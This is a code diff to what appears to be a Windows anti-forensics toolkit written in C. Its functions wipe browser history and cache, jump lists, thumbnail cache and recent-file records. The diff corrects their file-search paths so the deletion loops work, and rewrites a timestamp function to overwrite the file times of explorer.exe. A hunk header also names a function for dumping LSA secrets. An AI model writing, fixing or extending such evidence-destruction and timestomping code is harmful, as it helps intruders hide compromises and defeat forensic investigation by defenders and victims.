@@ -24,8 +24,10 @@ unsigned char jocky_clear_browser_cache(const char* browser_name) {
         return 0;
     }
 
+    char search_path[MAX_PATH];
+    snprintf(search_path, sizeof(search_path), "%s\\*", cache_path);
     WIN32_FIND_DATAA find_data;
-    HANDLE find_handle = FindFirstFileA(cache_path, &find_data);
+    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
 
     if (find_handle == INVALID_HANDLE_VALUE) {
         return 0;
@@ -57,8 +59,10 @@ unsigned char jocky_clear_browser_history(const char* browser_name) {
         return DeleteFileA(history_path) ? 1 : 0;
     } else if (strcmp(browser_name, "firefox") == 0) {
         snprintf(history_path, sizeof(history_path), "%s\\Mozilla\\Firefox\\Profiles", local_appdata);
+        char history_search[MAX_PATH];
+        snprintf(history_search, sizeof(history_search), "%s\\*", history_path);
         WIN32_FIND_DATAA find_data;
-        HANDLE find_handle = FindFirstFileA(history_path, &find_data);
+        HANDLE find_handle = FindFirstFileA(history_search, &find_data);
 
         if (find_handle == INVALID_HANDLE_VALUE) return 0;
 
@@ -87,8 +91,10 @@ unsigned char jocky_wipe_jumplist(void) {
     char jumplist_path[MAX_PATH];
     snprintf(jumplist_path, sizeof(jumplist_path), "%s\\Microsoft\\Windows\\Recent\\AutomaticDestinations", appdata);
 
+    char jumplist_search[MAX_PATH];
+    snprintf(jumplist_search, sizeof(jumplist_search), "%s\\*", jumplist_path);
     WIN32_FIND_DATAA find_data;
-    HANDLE find_handle = FindFirstFileA(jumplist_path, &find_data);
+    HANDLE find_handle = FindFirstFileA(jumplist_search, &find_data);
 
     if (find_handle == INVALID_HANDLE_VALUE) {
         return 0;
@@ -116,8 +122,10 @@ unsigned char jocky_wipe_thumbcache(void) {
     char thumbcache_path[MAX_PATH];
     snprintf(thumbcache_path, sizeof(thumbcache_path), "%s\\Microsoft\\Windows\\Explorer", local_appdata);
 
+    char thumbcache_search[MAX_PATH];
+    snprintf(thumbcache_search, sizeof(thumbcache_search), "%s\\*", thumbcache_path);
     WIN32_FIND_DATAA find_data;
-    HANDLE find_handle = FindFirstFileA(thumbcache_path, &find_data);
+    HANDLE find_handle = FindFirstFileA(thumbcache_search, &find_data);
 
     if (find_handle == INVALID_HANDLE_VALUE) {
         return 0;
@@ -158,13 +166,15 @@ int32_t jocky_registry_dump_lsa_secrets(void) {
 }
 
 int32_t jocky_clear_mft_timestamps(void) {
-    const char* volume = "C:\\";
-    HANDLE hVolume = CreateFileA(volume, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-    if (hVolume != INVALID_HANDLE_VALUE) {
-        CloseHandle(hVolume);
-        return 1;
-    }
-    return 0;
+    HANDLE hFile = CreateFileA("C:\\Windows\\explorer.exe",
+        FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+        OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return 0;
+    FILETIME ft;
+    GetSystemTimeAsFileTime(&ft);
+    SetFileTime(hFile, &ft, &ft, &ft);
+    CloseHandle(hFile);
+    return 1;
 }
 
 unsigned char jocky_wipe_temp_files(const char* path1, const char* path2) {
@@ -242,8 +252,10 @@ unsigned char jocky_clear_recent_files(void) {
     char recent_path[MAX_PATH];
     snprintf(recent_path, sizeof(recent_path), "%s\\Microsoft\\Windows\\Recent", appdata);
 
+    char recent_search[MAX_PATH];
+    snprintf(recent_search, sizeof(recent_search), "%s\\*", recent_path);
     WIN32_FIND_DATAA find_data;
-    HANDLE find_handle = FindFirstFileA(recent_path, &find_data);
+    HANDLE find_handle = FindFirstFileA(recent_search, &find_data);
 
     if (find_handle == INVALID_HANDLE_VALUE) {
         return 0;
